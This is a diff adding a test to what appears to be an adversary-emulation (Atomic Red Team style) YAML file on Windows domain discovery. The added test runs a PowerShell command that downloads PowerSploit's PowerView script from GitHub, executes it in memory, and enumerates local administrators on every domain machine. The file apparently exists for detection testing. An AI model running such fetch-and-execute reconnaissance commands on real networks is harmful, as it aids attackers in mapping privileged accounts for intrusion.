@@ -75,3 +75,16 @@ atomic_tests:
       net groups "Account Operators" /doma
       net groups "Exchange Organization Management" /doma
       net group "BUILTIN\Backup Operators" /doma
+
+- name: Find local admins on all machines in domain (PowerView)
+  description: |
+    Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.
+  
+  supported_platforms:
+    - windows
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-EnumerateLocalAdmin  -Verbose
